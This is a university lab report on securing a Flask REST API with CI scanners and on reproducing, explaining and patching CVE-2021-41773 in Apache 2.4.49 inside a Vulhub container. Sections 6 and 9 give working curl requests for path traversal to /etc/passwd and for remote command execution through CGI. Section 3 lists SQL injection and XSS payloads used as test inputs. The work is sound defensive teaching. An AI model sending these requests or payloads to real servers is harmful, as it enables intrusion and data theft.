# Laboratory Work No. 1

## Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis

| | |
| --- | --- |
| **Variant No.** | `________` |
| **Student (Surname, Name)** | `____________________` |
| **HDU number (student ID)** | `____________________` |
| **Group** | `________` |
| **Date** | `____ / ____ / 2026` |
| **Repository** | `https://github.com/<user>/work1-secure-api` |
| **Last successful pipeline** | `https://github.com/<user>/work1-secure-api/actions/runs/<id>` |

---

## 1. Purpose of the work

The goal of the work is to walk the full security lifecycle of a small backend
service: design it against the OWASP Top 10, automate the security checks in
CI/CD, then take a real, publicly documented vulnerability, reproduce it in an
isolated environment, explain its root cause, fix it and prove that the fix
works without breaking the application.

Two deliverables are produced: a working, hardened REST API with a green
pipeline, and a reproducible analysis of **CVE-2021-41773** in Apache HTTP Server
2.4.49 using the Vulhub environment.

---

## 2. Project and API

### 2.1 Stack

| Layer | Choice | Why |
| --- | --- | --- |
| Language / framework | Python 3.11 + Flask 3 | small, explicit, easy to show the security controls in code |
| Storage | SQLite via `sqlite3` with parameterised statements | no ORM magic hides the SQL, so the anti-injection measure is visible |
| Authentication | PyJWT (HS256) + bcrypt | industry-standard token and password primitives |
| Tests | pytest (25 tests) | every security property is pinned by a test |
| CI | GitHub Actions | required by the assignment |
| CVE lab | Docker Compose + Vulhub | isolated, disposable vulnerable environment |

### 2.2 Endpoints

| Method | Path | Auth | Purpose |
| --- | --- | --- | --- |
| POST | `/auth/login` | no | validate credentials, return a JWT |
| GET | `/api/data` | Bearer JWT | list the post feed, optional `?search=` |
| POST | `/api/notes` | Bearer JWT | **self-chosen endpoint**: create a note owned by the caller |
| GET | `/api/notes/<id>` | Bearer JWT | read one note (owner or admin only) |
| GET | `/api/me` | Bearer JWT | current user profile |
| GET | `/health` | no | liveness probe |

Example session:

```
$ curl -s -i http://127.0.0.1:5001/api/data
HTTP/1.1 401 UNAUTHORIZED
WWW-Authenticate: Bearer realm="api"
{"error":{"code":"missing_token","message":"A Bearer token is required."}}

$ curl -s -X POST http://127.0.0.1:5001/auth/login -d '{"username":"alice","password":"Alice-Passw0rd!"}'
{"access_token":"eyJhbGciOiJIUzI1NiIs...","token_type":"Bearer","expires_in":1800}

$ curl -s -H 'Authorization: Bearer <token>' http://127.0.0.1:5001/api/data
{"count":3,"items":[{"id":1,"title":"Welcome to the secure notes API","author":"alice", ...}]}
```

The full 9-step curl transcript is stored in `reports/curl-transcript.txt`.

`[[SCREENSHOT: terminal running scripts/live_demo.ps1 – steps 1, 3, 4 visible]]`

---

## 3. Implemented security measures

### 3.1 Protection against SQL injection (A03)

All database access goes through parameterised statements. The query text and
the values are sent separately, so a value can never be parsed as SQL syntax.

```python
user = db.execute(
    "SELECT id, username, password_hash, role FROM users WHERE username = ?",
    (username,),
).fetchone()
```

Supporting details:

* no f-strings, `%` formatting or `.format()` near SQL anywhere in the code base;
* the `?search=` term is bound *and* its `%`/`_` wildcards are escaped
  (`LIKE ? ESCAPE '\'`), so `?search=%` does not dump the whole table;
* table and column names are hard-coded, never taken from input.

Verification — the payloads below are stored as data, not executed:

```
$ curl -s -H "Authorization: Bearer $T" "http://127.0.0.1:5001/api/data?search=%27%20OR%201%3D1--"
{"count":0,"items":[]}
```

`tests/test_security.py` replays `' OR '1'='1`, `alice' --`,
`' UNION SELECT id, username, password_hash … --` and `'; DROP TABLE users; --`
against both the login and the search endpoint: all are refused or return zero
rows, and the table still exists afterwards.

### 3.2 Protection against XSS (A03)

The API answers with JSON, which is *not* automatically XSS-safe — clients put
the JSON into the DOM. Therefore every string is HTML-escaped on the way out
(`escape_deep` in `app/security.py`), and the response carries hardening
headers:

```
Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; base-uri 'none'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: no-referrer
```

Verification:

```
$ curl -s -X POST .../api/notes -d '{"title":"<script>alert(1)</script>","body":"<img src=x onerror=alert(2)>"}'
{"id":4,"title":"&lt;script&gt;alert(1)&lt;/script&gt;","body":"&lt;img src=x onerror=alert(2)&gt;", ...}
```

The stored markup comes back inert: no `<script>`, no `<img onerror>` reaches the
client as markup.

### 3.3 Broken authentication (A07)

* **Password storage** — bcrypt with a per-password random salt and cost factor
  12. Two users with the same password get different hashes; a stolen database
  cannot be turned into passwords cheaply. SHA-256 would be useless here: it is
  fast by design, so a GPU tests billions of candidates per second.
* **Token issuance** — HS256 JWT with `sub`, `username`, `role`, `iss`, `iat`,
  `nbf`, `exp` (30 min) and a random `jti`. The signing secret comes from the
  environment (`JWT_SECRET`); if it is absent, a random one is generated at
  start-up, so no default secret can ever ship.
* **Token verification** — `token_required` checks the header shape, decodes
  with `algorithms=["HS256"]` only (which rejects `alg: none` and
  algorithm-confusion forgeries), requires `exp`/`iat`/`sub`/`iss`, and then
  **re-reads the user from the database**, so a deleted or downgraded account
  cannot keep using an old token.
* **No user enumeration** — an unknown username still costs one bcrypt
  comparison (against a dummy hash) and returns exactly the same `401` body as a
  wrong password.

Verification: `tests/test_api.py` contains dedicated tests for a garbage token,
an expired token, an `alg: none` token, and a token signed with a different key
— all four are rejected with `401`.

---

## 4. CI/CD pipeline with security scanners

`.github/workflows/ci.yml` runs on every push and every pull request:

| Job | Tool | Gate |
| --- | --- | --- |
| `test` | pytest | any failing test fails the run |
| `sast` | bandit `-ll` | any medium/high finding fails the run |
| `sca` | pip-audit | any known-vulnerable dependency fails the run |

Reports are uploaded as build artifacts (`bandit-report`, `pip-audit-report`,
`pytest-report`), which is what the assignment asks to screenshot.

Local run of the same three commands:

```
$ pytest -q
25 passed

$ bandit -r app -x tests -ll
No issues identified.
Code scanned: 503 lines of code

$ pip-audit -r requirements.txt
No known vulnerabilities found
```

`[[SCREENSHOT: GitHub Actions – all three jobs green]]`

`[[SCREENSHOT: sast job log – "No issues identified"]]`

`[[SCREENSHOT: sca job log – "No known vulnerabilities found"]]`

---

## 5. Selected vulnerability

| | |
| --- | --- |
| **CVE** | CVE-2021-41773 |
| **Product** | Apache HTTP Server 2.4.49 |
| **Class** | CWE-22 – path traversal; CWE-20 – improper input validation |
| **CVSS 3.1** | 7.5 HIGH (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`) |
| **Published** | 5 October 2021 |
| **Fixed in** | 2.4.51 (2.4.50 was an incomplete fix) |
| **Source** | NVD, Apache HTTP Server security page, Vulhub `httpd/CVE-2021-41773` |

Apache 2.4.49 introduced a rewritten request-path normaliser. A crafted URL can
therefore make the server map a request to a file **outside** the document root
and return it. If `<Directory />` is permissive, arbitrary files are disclosed;
if CGI is enabled, the same traversal reaches `/bin/sh` and the request body is
executed as a shell script — remote code execution.

The Vulhub environment for this CVE ships exactly that configuration: 2.4.49
with `mod_cgi`/`mod_cgid` enabled and `<Directory />` relaxed to
`Require all granted`.

---

## 6. Reproduction

Environment: Docker Compose + Vulhub recipe (`vulnerability/vulnerable/`).

```
$ cd vulnerability/vulnerable
$ docker compose up --build -d
$ curl -s http://127.0.0.1:8080/
It works!
```

### 6.1 File disclosure

```
$ curl -v --path-as-is \
    'http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
< HTTP/1.1 200 OK
...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

`--path-as-is` is essential: otherwise curl normalises `.%2e/…` into `../` on
the client and the request never reaches the vulnerable code path.

### 6.2 Remote code execution

```
$ curl -v --data 'echo;id' \
    'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
< HTTP/1.1 200 OK
...
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

`echo;` terminates the CGI response headers so that `id` output is visible in
the body.

Both attacks were executed against the running container on this machine; the
exact status lines, `Server: Apache/2.4.49` headers and bodies are stored in
`reports/cve-41773-phase1.log`.

`[[SCREENSHOT: terminal – curl traversal returning root:x:0:0]]`

`[[SCREENSHOT: terminal – curl CGI returning uid=1(daemon)]]`

---

## 7. Root cause analysis

Apache 2.4.49 removed the old `ap_getparents()` / `ap_no2slash()` helpers and
replaced them with a single `ap_normalize_path()` used by
`ap_core_translate()`. The new function walks the URL segment by segment and
refuses to let the path climb above the request root:

```c
if (!seg_start || strcmp(seg_start, "..") == 0) {
    if (path == path_start) return 0;   /* would leave the root */
    path--;                             /* drop the previous segment */
}
```

The error is one of **ordering**: the comparison is made against the *still
percent-encoded* segment, while decoding happens later in the same pass.

Take the segment `.%2e`:

1. `strcmp(".%2e", "..") != 0`, so the "cannot go above the root" branch is not
   taken and the segment looks like an ordinary file name.
2. The decoder then turns `%2e` into `.`, so the segment becomes `..`.
3. `ap_core_translate()` joins the result to `DocumentRoot` and the filesystem
   resolves the `..` — the path escapes the web root.

This is why the exploit uses the odd `.%2e` spelling: a plain `../` is caught by
the check; the encoded variant is not. The defect is a validate-before-normalise
logic error, not a missing check.

The configuration makes the impact worse:

* `<Directory />` was set to `Require all granted`, so paths outside the
  document root are authorised at all;
* `mod_cgi`/`mod_cgid` are loaded, so the traversed `/bin/sh` is *executed*
  instead of merely disclosed.

`[[SCREENSHOT: docker-compose/Dockerfile showing 2.4.49 + Require all granted + CGI]]`

---

## 8. Applied fix

Three independent layers (`vulnerability/fixed/`):

1. **Patch the software** — base image `httpd:2.4.51`. The corrected normaliser
   decodes first and validates afterwards, so `.%2e` can no longer hide a `..`.
   2.4.51 rather than 2.4.50, because 2.4.50 still allowed a variant bypass
   (`%%32%65`).
2. **Restore default-deny** — `<Directory /> Require all denied`, with an
   explicit `<Directory "/usr/local/apache2/htdocs"> Require all granted`. Even a
   future traversal bug can no longer read `/etc/passwd`.
3. **Reduce the attack surface** — `mod_cgi`/`mod_cgid` are not loaded. A static
   file service has nothing to execute, so file disclosure cannot become RCE.

```dockerfile
FROM httpd:2.4.51
RUN sed -i 's|^LoadModule cgi_module|#LoadModule cgi_module|'  /usr/local/apache2/conf/httpd.conf ; \
    sed -i 's|^LoadModule cgid_module|#LoadModule cgid_module|' /usr/local/apache2/conf/httpd.conf
COPY hardening.conf /usr/local/apache2/conf/extra/hardening.conf
```

Why this is effective: layer 1 removes the vulnerable code path; layers 2 and 3
are not redundant "belt and braces" but separate trust boundaries — the
authorisation layer protects against *any* path-normalisation bug, and the
attack-surface layer protects against *any* file-disclosure bug being escalated
to code execution.

---

## 9. Proof that the vulnerability is eliminated

Same commands, rebuilt environment:

```
$ cd vulnerability/fixed && docker compose up --build -d

$ curl --path-as-is -i 'http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
HTTP/1.1 400 Bad Request
Server: Apache/2.4.51 (Unix)
# body contains no root:x:0:0

$ curl --path-as-is -i --data 'echo;id' 'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
HTTP/1.1 400 Bad Request
Server: Apache/2.4.51 (Unix)
# body contains no uid=
```

Regression test — the service must still work:

```
$ curl -s -i http://127.0.0.1:8080/
HTTP/1.1 200 OK
<html><body><h1>It works!</h1></body></html>
```

### 9.1 The three scenarios, measured

To show that the patch and the hardening are two *different* controls, the
vulnerable 2.4.49 binary was also run with its default (secure) configuration,
i.e. the code is still vulnerable but `Require all denied` and no CGI.

| Scenario (`Server` header) | Traversal → `/etc/passwd` | CGI execution | `GET /` |
| --- | --- | --- | --- |
| 2.4.49 + Vulhub config (`Apache/2.4.49`) | **200**, `root:x:0:0:root:/root:/bin/bash` | **200**, `uid=1(daemon) gid=1(daemon)` | 200 |
| 2.4.49 + default config (`Apache/2.4.49`) | **403 Forbidden** | **403 Forbidden** | 200 |
| 2.4.51 + hardening (`Apache/2.4.51`) | **400 Bad Request** | **400 Bad Request** | 200 |

Reading the table:

* row 1 is the vulnerability;
* row 2 is the *configuration* layer alone — the vulnerable code is present,
  the attack still fails, so the fix cannot rely on the version bump being
  applied correctly everywhere;
* row 3 is the *patch* — the request now dies inside the normaliser (400)
  before authorisation, which is what a genuine code fix looks like. A 403
  would mean "the router still resolved it and authorisation caught it".

Automated verdict (`vulnerability/run_demo.ps1 -Phase all`), one run per phase:

```
PHASE 1: Apache 2.4.49 + Vulhub config
VERDICT: file disclosure = SUCCESS (vulnerable, as expected)
VERDICT: command execution = SUCCESS (vulnerable, as expected)
Result: PASS - vulnerability reproduced

PHASE 2: Apache 2.4.49 (still vulnerable code) + default hardening
VERDICT: traversal blocked = True
VERDICT: command execution blocked = True
VERDICT: normal functionality intact = True
Result: PASS - vulnerability eliminated

PHASE 3: Apache 2.4.51 + hardening
VERDICT: traversal blocked = True
VERDICT: command execution blocked = True
VERDICT: normal functionality intact = True
Result: PASS - vulnerability eliminated
```

Raw transcripts: `reports/cve-41773-all.log`,
`reports/cve-41773-phase1.log`, `reports/cve-41773-hardened-config.log`,
`reports/cve-41773-phase2.log`.

`[[SCREENSHOT: fixed environment – both attacks return 400, / still 200]]`

`[[SCREENSHOT: hardened 2.4.49 – both attacks return 403, / still 200]]`

---

## 10. Conclusion

The work produced (a) a working API whose security properties are enforced in
code *and* pinned by tests, (b) a CI pipeline that fails on a medium SAST finding
or a vulnerable dependency, and (c) a reproducible exploitation-and-fix cycle for
a real CVE.

The most transferable lesson is from part (c): a vulnerability does not have to
be a missing check. In CVE-2021-41773 the check existed and was correct — it
just ran on a different representation of the string than the one that was later
used. Input must be normalised *before* it is validated, never after, and
defence in depth (default-deny + minimal attack surface) is what keeps one such
mistake from becoming remote code execution.

---

## Appendix A. Control questions (short answers)

1. **bcrypt vs SHA-256 for passwords.** SHA-256 is designed to be fast, so a GPU
   can try billions of candidates per second. bcrypt is deliberately slow and
   tunable (cost 12 ≈ 2^12 rounds), and it stores a per-password salt inside the
   hash, so identical passwords produce different hashes and precomputed
   rainbow tables do not apply.
2. **SAST vs DAST.** SAST analyses source code without running it — it sees
   every branch, including unreachable code, but produces false positives and
   cannot see configuration or runtime state. DAST attacks a running
   application from outside — it finds real, reachable issues but only covers
   what it can reach and gives less precise localisation.
3. **JWT mechanism.** A JWT is `base64url(header).base64url(payload).signature`.
   The payload carries claims (`sub`, `role`, `exp`, `iss`, `jti`). The server
   verifies the signature with a shared secret (HS256) or public key (RS256) and
   checks the time-based and issuer claims. The payload is signed, not
   encrypted — anyone can read it, so no secrets belong in it.
4. **Risk of not auditing dependencies.** Third-party code runs with your
   privileges. An unpatched library with a known CVE (Log4Shell, the
   event-stream incident) gives an attacker code execution or data access
   without ever touching your own source. SCA is the only control that catches
   this, because SAST looks at *your* code.
5. **Docker/Vulhub vs installing vulnerable software.** Containers are
   disposable, isolated and reproducible: no host pollution, no leftover
   services, a rollback is `docker compose down`, and the exact vulnerable
   version is pinned in a file that can be shared with the whole class.
6. **Vulnerability vs exploit.** A vulnerability is the flaw itself
   (`ap_normalize_path` accepts `.%2e` because it validates before decoding). An
   exploit is the concrete sequence of requests that abuses it
   (`curl --path-as-is /icons/.%2e/…/etc/passwd`). In this work the
   vulnerability is in Apache's normaliser; the exploit is the curl request.
7. **Why regression testing after a patch.** A patch changes behaviour, and a
   security fix that disables the feature is not a fix. Here, a perfectly
   "secure" answer would be to block the whole service; the regression check
   (`GET /` still returns 200) proves the legitimate path still works.
8. **Why reproduce CVEs as a specialist.** A pentester needs to know what a
   working exploit looks like in order to judge whether a target is really
   affected, and a SOC analyst needs the same knowledge to recognise the
   traffic in logs. Reproduction turns a CVE description into a concrete
   signature: the `.%2e` pattern in a URL is trivial to grep for once you have
   seen it.
